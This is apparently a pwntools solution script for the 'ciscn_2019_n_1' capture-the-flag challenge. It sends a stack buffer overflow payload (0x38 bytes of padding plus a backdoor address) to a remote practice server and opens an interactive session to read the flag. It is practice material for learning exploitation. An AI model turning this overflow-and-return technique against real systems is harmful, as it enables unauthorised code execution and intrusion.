# method one

from pwn import *


# p = process("./ciscn_2019_n_1")
p = remote("node4.buuoj.cn", 26553)

back_door = 0x004006BE

# ret to ```cat /flag```
payload = cyclic(0x30+0x8)+p64(back_door)
p.sendline(payload)

p.interactive()

